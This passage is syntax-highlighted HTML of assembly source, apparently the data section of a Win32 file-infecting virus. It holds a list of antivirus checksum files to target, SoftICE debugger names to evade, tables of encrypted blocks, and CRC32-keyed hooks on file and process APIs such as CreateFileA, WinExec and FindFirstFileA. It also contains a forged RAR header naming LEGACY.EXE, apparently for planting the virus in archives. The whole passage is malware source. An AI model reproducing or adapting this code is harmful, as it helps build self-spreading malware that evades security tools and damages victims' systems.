            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"CHKLIST.TAV"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"CHKLIST.MS"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"CHKLIST.CPS"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"AVP.CRC"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"IVB.NTZ"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"SMARTCHK.MS"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"SMARTCHK.CPS"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">Billy_Bel</span><span class="sc0">

</span><span class="sc5">Drivers2Avoid</span><span class="sc0">           </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"\\.\SICE"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"\\.\NTICE"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">Billy_Bel</span><span class="sc0">

</span><span class="sc1">; iENC structure</span><span class="sc0">
</span><span class="sc1">; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;       +00h    Size of block</span><span class="sc0">
</span><span class="sc1">;       +02h    Offset of block - offset of virus start</span><span class="sc0">

</span><span class="sc5">iENC_struc</span><span class="sc0">              </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
            </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">eBlock1</span><span class="sc4">-</span><span class="sc5">Block1</span><span class="sc4">)</span><span class="sc0">
            </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Block1</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">)</span><span class="sc0">

            </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">eBlock2</span><span class="sc4">-</span><span class="sc5">Block2</span><span class="sc4">)</span><span class="sc0">
            </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Block2</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">)</span><span class="sc0">

            </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">eBlock3</span><span class="sc4">-</span><span class="sc5">Block3</span><span class="sc4">)</span><span class="sc0">
            </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Block3</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">)</span><span class="sc0">

            </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">eBlock4</span><span class="sc4">-</span><span class="sc5">Block4</span><span class="sc4">)</span><span class="sc0">
            </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Block4</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">)</span><span class="sc0">

            </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">eBlock5</span><span class="sc4">-</span><span class="sc5">Block5</span><span class="sc4">)</span><span class="sc0">
            </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Block5</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">)</span><span class="sc0">

            </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">eBlock6</span><span class="sc4">-</span><span class="sc5">Block6</span><span class="sc4">)</span><span class="sc0">
            </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Block6</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">)</span><span class="sc0">

            </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">eBlock7</span><span class="sc4">-</span><span class="sc5">Block7</span><span class="sc4">)</span><span class="sc0">
            </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Block7</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">)</span><span class="sc0">

            </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">eBlock8</span><span class="sc4">-</span><span class="sc5">Block8</span><span class="sc4">)</span><span class="sc0">
            </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Block8</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">)</span><span class="sc0">

            </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">eBlock9</span><span class="sc4">-</span><span class="sc5">Block9</span><span class="sc4">)</span><span class="sc0">
            </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Block9</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">)</span><span class="sc0">

            </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">eBlockA</span><span class="sc4">-</span><span class="sc5">BlockA</span><span class="sc4">)</span><span class="sc0">
            </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">BlockA</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">)</span><span class="sc0">

            </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">eBlockB</span><span class="sc4">-</span><span class="sc5">BlockB</span><span class="sc4">)</span><span class="sc0">
            </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">BlockB</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">)</span><span class="sc0">

            </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">eBlockC</span><span class="sc4">-</span><span class="sc5">BlockC</span><span class="sc4">)</span><span class="sc0">
            </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">BlockC</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">)</span><span class="sc0">

            </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">eBlockD</span><span class="sc4">-</span><span class="sc5">BlockD</span><span class="sc4">)</span><span class="sc0">
            </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">BlockD</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">)</span><span class="sc0">

            </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">eBlockE</span><span class="sc4">-</span><span class="sc5">BlockE</span><span class="sc4">)</span><span class="sc0">
            </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">BlockE</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">)</span><span class="sc0">

            </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">eBlockF</span><span class="sc4">-</span><span class="sc5">BlockF</span><span class="sc4">)</span><span class="sc0">
            </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">BlockF</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">)</span><span class="sc0">

            </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">eBlock10</span><span class="sc4">-</span><span class="sc5">Block10</span><span class="sc4">)</span><span class="sc0">
            </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Block10</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">)</span><span class="sc0">

            </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">eBlock11</span><span class="sc4">-</span><span class="sc5">Block11</span><span class="sc4">)</span><span class="sc0">
            </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Block11</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">)</span><span class="sc0">

            </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">eBlock12</span><span class="sc4">-</span><span class="sc5">Block12</span><span class="sc4">)</span><span class="sc0">
            </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Block12</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">)</span><span class="sc0">

            </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">eBlock13</span><span class="sc4">-</span><span class="sc5">Block13</span><span class="sc4">)</span><span class="sc0">
            </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Block13</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">n_iENC_blocks</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">((</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">iENC_struc</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0">

            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">Billy_Bel</span><span class="sc0">

</span><span class="sc5">@@Hookz</span><span class="sc0">                 </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc1">; @@Hookz structure</span><span class="sc0">
</span><span class="sc1">; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;       +00h    API CRC32</span><span class="sc0">
</span><span class="sc1">;       +04h    Address of the new handler for that API</span><span class="sc0">
</span><span class="sc1">;       +08h    The address of the original API</span><span class="sc0">

            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">02308923Fh</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">HookMoveFileA</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">hMoveFileA</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">000000000h</span><span class="sc0">

            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">05BD05DB1h</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">HookCopyFileA</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">hCopyFileA</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">000000000h</span><span class="sc0">

            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">08F48B20Dh</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">HookGetFullPathNameA</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">hGetFullPathNameA</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">000000000h</span><span class="sc0">

            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0DE256FDEh</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">HookDeleteFileA</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">hDeleteFileA</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">000000000h</span><span class="sc0">

            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">028452C4Fh</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">HookWinExec</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">hWinExec</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">000000000h</span><span class="sc0">

            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0267E0B05h</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">HookCreateProcessA</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">hCreateProcessA</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">000000000h</span><span class="sc0">

            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">08C892DDFh</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">HookCreateFileA</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">hCreateFileA</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">000000000h</span><span class="sc0">

            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0C633D3DEh</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">HookGetFileAttributesA</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">hGetFileAttributesA</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">000000000h</span><span class="sc0">

            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">03C19E536h</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">HookSetFileAttributesA</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">hSetFileAttributesA</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">000000000h</span><span class="sc0">

            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0F2F886E3h</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Hook_lopen</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">h_lopen</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">000000000h</span><span class="sc0">

            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">03BE43958h</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">HookMoveFileExA</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">hMoveFileExA</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">000000000h</span><span class="sc0">

            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0953F2B64h</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">HookCopyFileExA</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">hCopyFileExA</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">000000000h</span><span class="sc0">

            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">068D8FC46h</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">HookOpenFile</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">hOpenFile</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">000000000h</span><span class="sc0">

            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0FFC97C1Fh</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">HookGetProcAddress</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">hGetProcAddress</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">000000000h</span><span class="sc0">

            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0AE17EBEFh</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">HookFindFirstFileA</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">hFindFirstFileA</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">000000000h</span><span class="sc0">

            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0AA700106h</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">HookFindNextFileA</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">hFindNextFileA</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">000000000h</span><span class="sc0">

</span><span class="sc5">nHookedAPIs</span><span class="sc0">             </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">(((</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@@Hookz</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc4">)/</span><span class="sc2">3</span><span class="sc4">)</span><span class="sc0">

            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">Billy_Bel</span><span class="sc0">

</span><span class="sc5">@@NamezCRC32</span><span class="sc0">            </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
</span><span class="sc5">@FindFirstFileA</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0AE17EBEFh</span><span class="sc0">
</span><span class="sc5">@FindNextFileA</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0AA700106h</span><span class="sc0">
</span><span class="sc5">@FindClose</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0C200BE21h</span><span class="sc0">
</span><span class="sc5">@CreateFileA</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">08C892DDFh</span><span class="sc0">
</span><span class="sc5">@DeleteFileA</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0DE256FDEh</span><span class="sc0">
</span><span class="sc5">@SetFilePointer</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">085859D42h</span><span class="sc0">
</span><span class="sc5">@SetFileAttributesA</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">03C19E536h</span><span class="sc0">
</span><span class="sc5">@CloseHandle</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">068624A9Dh</span><span class="sc0">
</span><span class="sc5">@GetCurrentDirectoryA</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0EBC6C18Bh</span><span class="sc0">
</span><span class="sc5">@SetCurrentDirectoryA</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0B2DBD7DCh</span><span class="sc0">
</span><span class="sc5">@GetWindowsDirectoryA</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0FE248274h</span><span class="sc0">
</span><span class="sc5">@GetSystemDirectoryA</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0593AE7CEh</span><span class="sc0">
</span><span class="sc5">@CreateFileMappingA</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">096B2D96Ch</span><span class="sc0">
</span><span class="sc5">@MapViewOfFile</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0797B49ECh</span><span class="sc0">
</span><span class="sc5">@UnmapViewOfFile</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">094524B42h</span><span class="sc0">
</span><span class="sc5">@SetEndOfFile</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">059994ED6h</span><span class="sc0">
</span><span class="sc5">@GetProcAddress</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0FFC97C1Fh</span><span class="sc0">
</span><span class="sc5">@LoadLibraryA</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">04134D1ADh</span><span class="sc0">
</span><span class="sc5">@GetSystemTime</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">075B7EBE8h</span><span class="sc0">
</span><span class="sc5">@CreateThread</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">019F33607h</span><span class="sc0">
</span><span class="sc5">@WaitForSingleObject</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0D4540229h</span><span class="sc0">
</span><span class="sc5">@ExitThread</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0058F9201h</span><span class="sc0">
</span><span class="sc5">@GetTickCount</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0613FD7BAh</span><span class="sc0">
</span><span class="sc5">@FreeLibrary</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0AFDF191Fh</span><span class="sc0">
</span><span class="sc5">@WriteFile</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">021777793h</span><span class="sc0">
</span><span class="sc5">@GlobalAlloc</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">083A353C3h</span><span class="sc0">
</span><span class="sc5">@GlobalFree</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">05CDF6B6Ah</span><span class="sc0">
</span><span class="sc5">@GetFileSize</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0EF7D811Bh</span><span class="sc0">
</span><span class="sc5">@GetFileAttributesA</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0C633D3DEh</span><span class="sc0">
</span><span class="sc5">@ReadFile</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">054D8615Ah</span><span class="sc0">
</span><span class="sc5">@GetCurrentProcess</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">003690E66h</span><span class="sc0">
</span><span class="sc5">@GetPriorityClass</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0A7D0D775h</span><span class="sc0">
</span><span class="sc5">@SetPriorityClass</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0C38969C7h</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">Billy_Bel</span><span class="sc0">
</span><span class="sc5">@FindWindowA</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">085AB3323h</span><span class="sc0">
</span><span class="sc5">@PostMessageA</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">086678A04h</span><span class="sc0">
</span><span class="sc5">@MessageBoxA</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0D8556CF7h</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">Billy_Bel</span><span class="sc0">
</span><span class="sc5">@RegCreateKeyExA</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">02C822198h</span><span class="sc0">
</span><span class="sc5">@RegSetValueExA</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">05B9EC9C6h</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">Billy_Bel</span><span class="sc0">

</span><span class="sc1">; --- RAR Header</span><span class="sc0">

</span><span class="sc5">RARHeader</span><span class="sc0">               </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
</span><span class="sc5">RARHeaderCRC</span><span class="sc0">            </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">RARType</span><span class="sc0">                 </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">74h</span><span class="sc0">
</span><span class="sc5">RARFlags</span><span class="sc0">                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">8000h</span><span class="sc0">
</span><span class="sc5">RARHeadsize</span><span class="sc0">             </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">sRARHeaderSize</span><span class="sc0">
</span><span class="sc5">RARCompressed</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">RAROriginal</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">RAROs</span><span class="sc0">                   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">RARCrc32</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">RARFileTime</span><span class="sc0">             </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">archive_mark</span><span class="sc0">
</span><span class="sc5">RARFileDate</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">31h</span><span class="sc4">,</span><span class="sc2">24h</span><span class="sc0">
</span><span class="sc5">RARNeedVer</span><span class="sc0">              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">14h</span><span class="sc0">
</span><span class="sc5">RARMethod</span><span class="sc0">               </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">30h</span><span class="sc0">
</span><span class="sc5">RARFnameSize</span><span class="sc0">            </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">sRARNameSize</span><span class="sc0">
</span><span class="sc5">RARAttrib</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">RARName</span><span class="sc0">                 </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"LEGACY.EXE"</span><span class="sc0">
</span><span class="sc5">sRARHeaderSize</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">RARHeader</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">sRARNameSize</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">RARName</span><span class="sc4">)</span><span class="sc0">

